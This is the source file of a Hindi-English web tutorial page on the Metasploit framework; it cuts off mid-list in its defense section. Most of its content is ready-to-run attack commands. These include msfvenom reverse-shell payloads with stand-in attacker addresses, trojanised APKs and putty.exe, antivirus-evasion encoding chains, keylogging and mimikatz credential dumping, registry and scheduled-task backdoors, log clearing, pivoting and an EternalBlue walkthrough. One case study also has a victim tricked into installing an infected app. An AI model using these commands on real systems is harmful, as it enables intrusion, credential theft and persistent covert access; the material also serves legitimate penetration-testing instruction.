import { Link } from 'react-router-dom'
import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Metasploit() {
  return (
    <TutorialLayout
      title="metasploit-framework"
      subtitle="दुनिया का सबसे लोकप्रिय पेनेट्रेशन टेस्टिंग फ्रेमवर्क — 2000+ exploits, 500+ payloads"
      icon="💀"
      prev={{ to: '/tool/nmap', label: 'nmap' }}
      next={{ to: '/tool/bettercap', label: 'bettercap' }}
    >
      <h2>What is Metasploit?</h2>
      <p>
        Metasploit Framework दुनिया का सबसे लोकप्रिय और शक्तिशाली पेनेट्रेशन टेस्टिंग फ्रेमवर्क है। इसमें 2000+ exploits, 500+ payloads, और हज़ारों auxiliary modules हैं। Exploitation, post-exploitation, payload generation, vulnerability scanning — सब एक जगह। हर ethical hacker के toolbox में यह होना चाहिए।
      </p>
      <p>
        Metasploit को H.D. Moore ने 2003 में बनाया था। बाद में Rapid7 ने इसे अधिग्रहित किया और आज यह सबसे advanced penetration testing tool है। यह open source है (Community Edition) और Kali Linux और Kali Nethunter दोनों में pre-installed आता है। यह Ruby भाषा में लिखा गया है।
      </p>
      <p>
        Metasploit का इंटरफेस कई तरह का है — msfconsole (command line), msfweb (web interface), और Armitage (GUI)। msfconsole सबसे ज़्यादा इस्तेमाल होता है क्योंकि इसमें सबसे ज़्यादा features हैं। आप अपने खुद के modules भी लिख सकते हैं।
      </p>
      <p>
        Metasploit सिर्फ exploitation tool नहीं है — यह एक complete framework है। इसमें vulnerability scanning, social engineering, wireless attacks, web application testing सब शामिल है। Meterpreter payload सबसे powerful feature है — memory में run करता है, disk पर कुछ नहीं लिखता, antivirus detect नहीं कर पाता।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Metasploit केवल authorized testing पर ही इस्तेमाल करें। Unauthorized exploitation criminal offense है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है।
      </div>

      <h2>History of Metasploit</h2>
      <p>
        Metasploit की शुरुआत 2003 में H.D. Moore ने की थी। H.D. Moore एक famous security researcher हैं जो बाद में Rapid7 के co-founder बने। शुरू में यह Perl में लिखा गया था और सिर्फ कुछ exploits थे।
      </p>
      <p>
        2007 में Metasploit को Ruby में rewrite किया गया — यह एक major milestone था। Ruby choose करने का reason था कि यह object-oriented है और modules लिखना आसान है। 2009 में Rapid7 ने Metasploit का acquisition किया।
      </p>
      <p>
        आज Metasploit Framework GitHub पर 33,000+ stars के साथ सबसे popular exploitation framework है। हर दिन नए modules add होते हैं। यह security community का backbone है — CTF competitions, bug bounty, red team operations सब में इस्तेमाल होता है।
      </p>

      <h2>How Metasploit Works?</h2>
      <p>
        Metasploit modular architecture पर based है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Exploit Engine:</strong> Vulnerabilities का फायदा उठाकर target system पर access प्राप्त करता है</li>
        <li><strong className="text-white">Payload System:</strong> Exploit के बाद target पर execute होने वाला code — reverse shell, bind shell, meterpreter</li>
        <li><strong className="text-white">Encoder:</strong> Payloads को encode करके antivirus detection से बचाता है</li>
        <li><strong className="text-white">Auxiliary Modules:</strong> Scanning, fuzzing, enumeration — exploitation नहीं करते लेकिन बहुत useful हैं</li>
        <li><strong className="text-white">Post Modules:</strong> Exploitation के बाद — credential dumping, privilege escalation, persistence</li>
        <li><strong className="text-white">Meterpreter:</strong> Advanced in-memory payload जो full control देता है</li>
        <li><strong className="text-white">Database:</strong> PostgreSQL में scan results, hosts, services store होते हैं</li>
        <li><strong className="text-white">Nexpose Integration:</strong> Built-in vulnerability scanner integration</li>
      </ul>

      <h2>Installation</h2>
      <CodeBlock
        title="Metasploit Installation"
        code={`# Kali Linux/Nethunter में (pre-installed):
msfconsole --version

# Debian/Ubuntu में install:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Termux (Android) में:
pkg install metasploit

# Database initialize करें (first time):
sudo msfdb init

# Database status check:
msfdb status

# Metasploit update करें:
msfupdate

# Docker से:
docker pull metasploitframework/metasploit-framework
docker run -it metasploitframework/metasploit-framework ./msfconsole`}
      />

      <h2>Basic Usage</h2>
      <CodeBlock
        title="msfconsole Basics"
        code={`# Metasploit console start करें:
msfconsole

# Database connect (first time):
sudo msfdb init
db_connect msf:msf@127.0.0.1/msf

# Modules search करें:
search eternalblue
search type:exploit platform:android
search name:ssh

# Module use करें:
use exploit/windows/smb/ms17_010_eternalblue

# Options देखें:
show options

# Set करें:
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set PAYLOAD windows/meterpreter/reverse_tcp

# Run करें:
exploit
# या
run

# Background session:
background

# Sessions देखें:
sessions -l

# Session पर वापस:
sessions -i 1

# Session kill:
sessions -k 1`}
      />

      <h2>Important Commands</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">search</td><td className="py-2 px-3">Modules search करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">use</td><td className="py-2 px-3">Module select करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">show options</td><td className="py-2 px-3">Module options देखें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">set</td><td className="py-2 px-3">Option value set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exploit</td><td className="py-2 px-3">Module run करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">check</td><td className="py-2 px-3">Vulnerability check करें (exploit नहीं)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">background</td><td className="py-2 px-3">Session background करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sessions -l</td><td className="py-2 px-3">Active sessions list</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sessions -i N</td><td className="py-2 px-3">Session N पर interact करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">info</td><td className="py-2 px-3">Module info देखें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">setg</td><td className="py-2 px-3">Global option set करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">unsetg</td><td className="py-2 px-3">Global option clear करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">db_nmap</td><td className="py-2 px-3">Nmap scan (results DB में save)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hosts</td><td className="py-2 px-3">Discovered hosts list</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">services</td><td className="py-2 px-3">Discovered services list</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Module Types</h2>
      <p>
        Metasploit में कई तरह के modules हैं। हर module का अपना purpose है।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Module Type</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Example</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">exploit</td><td className="py-2 px-3">Vulnerability exploit करता है</td><td className="py-2 px-3 font-mono text-xs">exploit/windows/smb/ms17_010_eternalblue</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">payload</td><td className="py-2 px-3">Target पर code run करता है</td><td className="py-2 px-3 font-mono text-xs">windows/meterpreter/reverse_tcp</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">auxiliary</td><td className="py-2 px-3">Scanning, fuzzing, enumeration</td><td className="py-2 px-3 font-mono text-xs">auxiliary/scanner/portscan/tcp</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">post</td><td className="py-2 px-3">Post-exploitation</td><td className="py-2 px-3 font-mono text-xs">post/windows/gather/enum_domain</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">encoder</td><td className="py-2 px-3">Payload encode करता है (AV bypass)</td><td className="py-2 px-3 font-mono text-xs">x86/shikata_ga_nai</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">nop</td><td className="py-2 px-3">No Operation (padding)</td><td className="py-2 px-3 font-mono text-xs">x86/single_byte</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Payload Generation (msfvenom)</h2>
      <p>
        msfvenom Metasploit का payload generation tool है। इससे Android APK, Windows EXE, PHP, Python, Linux — सभी formats में payloads बनाए जा सकते हैं।
      </p>
      <CodeBlock
        title="Android Payload"
        code={`# Android reverse TCP payload:
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk

# Original APK में inject करें:
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -x original.apk -o evil.apk

# Listener setup (msfconsole में):
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit`}
      />

      <CodeBlock
        title="Windows Payload"
        code={`# Windows reverse TCP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.exe

# Encoded payload (AV bypass):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -o encoded.exe

# DLL injection:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o payload.dll

# PowerShell payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f ps1 -o shell.ps1`}
      />

      <CodeBlock
        title="Other Payloads"
        code={`# PHP web shell:
msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.php

# Python payload:
msfvenom -p python/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.py

# Linux payload:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.elf

# Bash reverse shell:
msfvenom -p cmd/unix/reverse_bash LHOST=YOUR_IP LPORT=4444 -o shell.sh

# Java payload:
msfvenom -p java/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.jar`}
      />

      <h2>Payload Types</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">Inline (Stageless)</h4>
          <p className="text-gray-400 text-sm">पूरा payload एक ही file में। बड़ा size लेकिन ज़्यादा reliable। Staging की ज़रूरत नहीं।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">Staged</h4>
          <p className="text-gray-400 text-sm">छोटा stager पहले जाता है, फिर बड़ा stage download होता है। छोटा size लेकिन staging ज़रूरी।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">Meterpreter</h4>
          <p className="text-gray-400 text-sm">सबसे advanced payload। Memory में run करता है, disk पर नहीं लिखता। बहुत सारे features।</p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-green font-mono font-bold">Shell</h4>
          <p className="text-gray-400 text-sm">Basic command shell। छोटा और तेज़ लेकिन कम features। Simple attacks के लिए।</p>
        </div>
      </div>

      <h2>Meterpreter Commands</h2>
      <p>
        Meterpreter Metasploit का सबसे powerful payload है। यह memory में run करता है और disk पर कुछ नहीं लिखता।
      </p>
      <CodeBlock
        title="Meterpreter Essential Commands"
        code={`# System info:
sysinfo

# Current user:
getuid

# Shell drop:
shell

# Files download/upload:
download /etc/passwd
upload payload.txt /tmp/

# Screenshot:
screenshot

# Keylogger:
keyscan_start
keyscan_dump
keyscan_stop

# Hash dump:
hashdump

# Persistence (reboot के बाद भी):
run persistence -U -i 5 -p 4444

# Port forward:
portfwd add -l 8080 -p 80 -r 192.168.1.100

# Privilege escalation:
getsystem

# UAC bypass:
bypassuac

# Token impersonation:
impersonate_token "NT AUTHORITY\\\\SYSTEM"

# Password steal (kiwi/mimikatz):
load kiwi
creds_all

# Network discovery:
run post/multi/gather/arp_scanner

# Auto migration:
run post/windows/manage/migrate

# Log clear:
clearev`}
      />

      <h2>Common Exploits</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Exploit</th>
              <th className="text-left py-2 px-3 text-neon-green">Target</th>
              <th className="text-left py-2 px-3 text-neon-green">Module Path</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">EternalBlue</td><td className="py-2 px-3">Windows SMB</td><td className="py-2 px-3 font-mono text-xs">exploit/windows/smb/ms17_010_eternalblue</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MS08-067</td><td className="py-2 px-3">Windows SMB</td><td className="py-2 px-3 font-mono text-xs">exploit/windows/smb/ms08_067_netapi</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Heartbleed</td><td className="py-2 px-3">OpenSSL</td><td className="py-2 px-3 font-mono text-xs">auxiliary/scanner/ssl/openssl_heartbleed</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Shellshock</td><td className="py-2 px-3">Bash/CGI</td><td className="py-2 px-3 font-mono text-xs">exploit/multi/http/apache_mod_cgi_bash_env_exec</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Dirty COW</td><td className="py-2 px-3">Linux Kernel</td><td className="py-2 px-3 font-mono text-xs">exploit/linux/local/dirtycow</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">BlueKeep</td><td className="py-2 px-3">Windows RDP</td><td className="py-2 px-3 font-mono text-xs">exploit/windows/rdp/cve_2019_0708_bluekeep</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">EternalRomance</td><td className="py-2 px-3">Windows SMB</td><td className="py-2 px-3 font-mono text-xs">exploit/windows/smb/ms17_010_psexec</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Auxiliary Modules</h2>
      <CodeBlock
        title="Scanning & Enumeration"
        code={`# Port scan:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# SMB scan:
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH scan:
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP scan:
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP scan:
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# MySQL scan:
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24
run

# DNS enumeration:
use auxiliary/gather/enum_dns
set DOMAIN target.com
run`}
      />

      <h2>Complete Attack Example</h2>
      <CodeBlock
        title="EternalBlue Attack Workflow"
        code={`# Step 1: Nmap scan:
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Step 2: Metasploit start:
msfconsole

# Step 3: Module use:
use exploit/windows/smb/ms17_010_eternalblue

# Step 4: Options set:
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Step 5: Check:
check

# Step 6: Exploit:
exploit

# Step 7: Meterpreter commands:
sysinfo
getuid
getsystem
hashdump
shell`}
      />

      <h2>Persistence Methods</h2>
      <CodeBlock
        title="Persistence Setup"
        code={`# Meterpreter persistence:
run persistence -U -i 5 -p 4444
# -U = user login पर start हो
# -i 5 = हर 5 seconds में connect try करे
# -p 4444 = port

# Registry persistence:
reg setval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v backdoor -d "C:\\\\backdoor.exe"

# Service persistence:
use exploit/windows/local/persistence_service

# Task scheduler:
schtasks /create /tn "backdoor" /tr "C:\\\\backdoor.exe" /sc onlogon`}
      />

      <h2>Payload Encoding</h2>
      <CodeBlock
        title="Encoding for AV Bypass"
        code={`# shikata_ga_nai encoder (most popular):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -o encoded.exe

# Multi-layer encoding:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -e x86/alpha_upper -i 3 -o multi_encoded.exe

# Encoder list:
msfvenom --list encoders

# All encoders try (best pick):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 --iterations 10 -o best_encoded.exe`}
      />

      <h2>Resource Scripts (Automation)</h2>
      <CodeBlock
        title="RC Scripts"
        code={`# RC script (exploit.rc):
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j

# RC script run:
msfconsole -r exploit.rc

# Batch mode (multiple targets):
use auxiliary/scanner/portscan/tcp
set RHOSTS file:targets.txt
run

# Auto exploit:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
exploit -j -z`}
      />

      <h2>Database Commands</h2>
      <CodeBlock
        title="Database Operations"
        code={`# Database initialize:
sudo msfdb init

# Database status:
msfdb status

# Nmap scan (results DB में):
db_nmap -sV -sC 192.168.1.0/24

# Discovered hosts:
hosts

# Discovered services:
services

# Discovered vulnerabilities:
vulns

# Credentials:
creds

# Loot:
loot

# Workspace management:
workspace -a new_workspace
workspace new_workspace`}
      />

      <h2>Metasploit vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Feature</th>
              <th className="text-left py-2 px-3 text-neon-green">Metasploit</th>
              <th className="text-left py-2 px-3 text-neon-green">Cobalt Strike</th>
              <th className="text-left py-2 px-3 text-neon-green">Sliver</th>
              <th className="text-left py-2 px-3 text-neon-green">Empire</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कीमत</td><td className="py-2 px-3">Free</td><td className="py-2 px-3">$$$</td><td className="py-2 px-3">Free</td><td className="py-2 px-3">Free</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Exploits</td><td className="py-2 px-3">2000+</td><td className="py-2 px-3">Limited</td><td className="py-2 px-3">None</td><td className="py-2 px-3">None</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Payloads</td><td className="py-2 px-3">500+</td><td className="py-2 px-3">Beacon</td><td className="py-2 px-3">Implant</td><td className="py-2 px-3">Agent</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">Armitage</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">Starkiller</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Evasion</td><td className="py-2 px-3">Basic</td><td className="py-2 px-3">Advanced</td><td className="py-2 px-3">Advanced</td><td className="py-2 px-3">Good</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Language</td><td className="py-2 px-3">Ruby</td><td className="py-2 px-3">Java</td><td className="py-2 px-3">Go</td><td className="py-2 px-3">Python/C#</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">Exploitation</td><td className="py-2 px-3">Red Team</td><td className="py-2 px-3">Red Team</td><td className="py-2 px-3">Post-Exploit</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Metasploit दुनिया भर में penetration testing और red team operations में daily use होता है। यहाँ कुछ real-world scenarios हैं जो दिखाते हैं कि Metasploit कैसे actual environments में काम करता है।
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Corporate Network Breach:</strong> एक penetration testing firm को एक बड़ी company का network test करना था। Nmap scan से पता चला कि Windows Server 2016 पर SMB port (445) open था। Metasploit में EternalBlue module use करके initial access मिला। फिर Meterpreter से hashdump करके domain admin credentials मिल गए। पूरा domain compromise हो गया सिर्फ 2 घंटे में। Company को report दी गई और patches apply करवाए गए।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Android Application Testing:</strong> एक mobile security researcher ने एक banking app test करना था। msfvenom से Android payload generate किया और original APK में inject किया। Social engineering से victim को infected APK install करवाया। Meterpreter session से app data, SMS, contacts सब access हो गया। SSL pinning bypass के लिए Frida भी use किया। Report में app की सभी vulnerabilities document की गईं।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — CTF Competition:</strong> एक CTF competition में team को एक vulnerable Linux server exploit करना था। Port scan से SSH (22) और HTTP (80) open मिले। Web application में file upload vulnerability मिली। PHP payload generate करके server पर upload किया। Meterpreter session से privilege escalation करके root access लिया। यह सब Metasploit + manual techniques combination से possible हुआ।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Metasploit अकेले powerful है, लेकिन दूसरे tools के साथ integrate करने स�र capabilities बढ़ जाती हैं।
      </p>
      <CodeBlock
        title="Metasploit + Nmap Integration"
        code={`# Nmap results directly DB में save:
db_nmap -sV -sC -O 192.168.1.0/24

# Nmap XML import करें:
db_import /path/to/nmap_scan.xml

# Hosts देखें:
hosts

# Services देखें:
services

# Specific service filter:
services -p 445

# Exploit suggest करें (कौन सा exploit काम करेगा):
search name:eternalblue
search type:exploit platform:windows`}
      />
      <CodeBlock
        title="Metasploit + Burp Suite"
        code={`# Burp Suite proxy के through Metasploit traffic:
# Burp में proxy listener start करो: 127.0.0.1:8080

# Metasploit में proxy set करो:
setg Proxies http:127.0.0.1:8080
setg ReverseAllowProxy true

# Web modules run करो — traffic Burp में intercept होगा:
use auxiliary/scanner/http/http_login
set RHOSTS target.com
run

# Proxy unset:
unsetg Proxies`}
      />
      <CodeBlock
        title="Metasploit + Cobalt Strike"
        code={`# Cobalt Strike Beacon से Meterpreter session:
# Cobalt Strike में foreign listener start करो

# Metasploit में:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit -j

# Cobalt Strike → Spawn → Meterpreter session

# दोनों frameworks का best use:
# Cobalt Strike = C2, evasion, persistence
# Metasploit = exploitation, post-exploitation modules`}
      />

      <h2>Performance Tuning</h2>
      <p>
        बड़े environments में Metasploit optimize करना ज़रूरी है। सही settings से scan time कम होता है और results better आते हैं।
      </p>
      <CodeBlock
        title="Performance Optimization"
        code={`# Database optimize:
sudo systemctl start postgresql
sudo msfdb init
db_rebuild_cache

# Thread count बढ़ाओ (scanning speed):
set Threads 20

# Global timeout reduce:
setg ConnectTimeout 10

# Workspace use करो (organized results):
workspace -a pentest_project
workspace pentest_project

# Scan scope limit करो:
set RHOSTS 192.168.1.1-50  # specific range
# पूरा /24 scan मत करो बिना need के

# Module cache rebuild (slow start fix):
msfconsole -q -x "db_rebuild_cache; exit"

# Resource file से batch processing:
# targets.txt में hosts डालो
use auxiliary/scanner/portscan/tcp
set RHOSTS file:targets.txt
set THREADS 50
run`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Penetration test के बाद report बनाना सबसे important step है। Metasploit built-in reporting provide करता है।
      </p>
      <CodeBlock
        title="Report Generation"
        code={`# Workspace से report export:
workspace my_pentest

# सभी hosts export:
hosts -o /tmp/hosts.csv

# सभी services export:
services -o /tmp/services.csv

# Vulnerabilities export:
vulns -o /tmp/vulns.csv

# Credentials export:
creds -o /tmp/creds.csv

# Loot export:
loot -o /tmp/loot.csv

# HTML report (Pro version):
# reports
# Generate Report → HTML/PDF

# Custom report script:
# Ruby script से DB query करके report बनाओ
# ~/.msf4/scripts/resource/ में save करो`}
      />
      <CodeBlock
        title="Result Analysis"
        code={`# कौन से hosts vulnerable हैं:
hosts -c address,os_name,purpose

# Critical services find करो:
services -p 21,22,23,80,443,445,3389

# High-risk vulnerabilities:
vulns -c vuln,name,severity

# Cracked passwords:
creds -c user,pass,ptype

# Sessions history:
sessions -l -v

# Loot review:
loot -t hash_dump`}
      />

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Database connection error आ रहा है', a: 'PostgreSQL service check करें: sudo systemctl start postgresql। Database initialize: sudo msfdb init। Manual connect: db_connect msf:msf@127.0.0.1/msf' },
          { q: 'Exploit काम नहीं कर रहा', a: 'Target vulnerable है verify करें — Nmap से scan करें। Payload सही set करें। Firewall/IDS block कर रहा होगा — different payload try करें।' },
          { q: 'Session drop हो रहा है', a: 'Network connection check करें। Persistence set करें। Stageless payloads use करें — ज़्यादा reliable हैं।' },
          { q: 'Payload antivirus detect कर रहा है', a: 'Encoding try करें — shikata_ga_nai, multi-encoder। Custom templates use करें (-x flag)। Veil या Shellter से generate करें।' },
          { q: 'Module not found error', a: 'msfupdate से Metasploit update करें। search command से exact module name find करें। Module path check करें।' },
          { q: 'Meterpreter commands काम नहीं कर रहे', a: 'Meterpreter version check करें — नया version ज़्यादा commands support करता है। migrate करें stable process में (explorer.exe)।' },
          { q: 'Port forwarding काम नहीं कर रहा', a: 'Firewall rules check करें। Local port already in use नहीं होना चाहिए। portfwd add -l LOCAL -p REMOTE -r TARGET syntax verify करें।' },
          { q: 'Nexpose scan slow है', a: 'Scan scope limit करें। Specific ports scan करें सब ports scan करने की बजाय। Performance tuning settings adjust करें।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Credential Harvesting</h2>
      <p>
        Meterpreter session से credentials dump करना post-exploitation का सबसे important हिस्सा है। Kiwi (Mimikatz) module से Windows credentials extract कर सकते हो।
      </p>
      <CodeBlock
        title="Credential Dumping"
        code={`# Meterpreter में kiwi load करें:
load kiwi

# सभी credentials:
creds_all

# Kerberos tickets:
creds_kerberos

# NTLM hashes:
creds_msv

# SAM database dump:
hashdump

# LSA secrets:
lsa_dump_sam

# WiFi passwords:
wifi_list

# Credential harvesting (post module):
run post/windows/gather/smart_hashdump
run post/windows/gather/credentials/credential_collector`}
      />

      <h2>Network Pivoting</h2>
      <p>
        एक compromised machine से दूसरे network तक पहुंचना pivoting कहलाता है। Meterpreter में port forwarding और route add से यह possible है।
      </p>
      <CodeBlock
        title="Pivoting Setup"
        code={`# Auto route (सभी networks):
run autoroute -s 192.168.2.0/24

# Manual route:
run autoroute -s 192.168.2.0/24 -n 255.255.255.0

# Port forward:
portfwd add -l 3389 -p 3389 -r 192.168.2.100

# SOCKS proxy:
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Proxychains से scan करें:
proxychains nmap -sT -Pn 192.168.2.0/24

# Pivot through session:
set SESSION 1
set RHOSTS 192.168.2.0/24`}
      />

      <h2>Web Application Testing</h2>
      <p>
        Metasploit में web application testing के लिए भी modules हैं — scanners, brute forcers, और exploits।
      </p>
      <CodeBlock
        title="Web Modules"
        code={`# HTTP version scan:
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Directory scanner:
use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
run

# Login brute force:
use auxiliary/scanner/http/http_login
set RHOSTS target.com
set USERPASS_FILE /usr/share/wordlists/rockyou.txt
run

# WordPress scanner:
use auxiliary/scanner/http/wordpress_scanner
set RHOSTS target.com
run

# SQL injection:
use auxiliary/scanner/http/sql_injection
set RHOSTS target.com
run`}
      />

      <h2>AV Evasion Techniques</h2>
      <p>
        Modern antivirus detect कर लेता है basic Metasploit payloads को। Evasion techniques use करनी पड़ती हैं।
      </p>
      <CodeBlock
        title="Evasion Methods"
        code={`# Method 1: Encoding:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -e x86/shikata_ga_nai -i 10 -o encoded.exe

# Method 2: Custom template (-x flag):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -x putty.exe -o evil_putty.exe

# Method 3: PowerShell (memory-only):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP -f ps1 -o shell.ps1
# PowerShell में run: powershell -ExecutionPolicy Bypass -File shell.ps1

# Method 4: Msfvenom + Veil combo:
# Veil framework से payload generate करें
# Msfconsole में listener setup करें

# Method 5: Manual encoding chain:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -f raw -o payload.bin
cat payload.bin | msfvenom -e x86/alpha_mixed -i 3 -f raw | msfvenom -e x86/shikata_ga_nai -i 3 -o final.exe

# Method 6: Staged vs Stageless:
# Staged (small, needs stager): windows/meterpreter/reverse_tcp
# Stageless (big, self-contained): windows/meterpreter_reverse_tcp`}
      />

      <h2>Detection and Defense</h2>
      <p>
        Metasploit attacks से कैसे बचें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
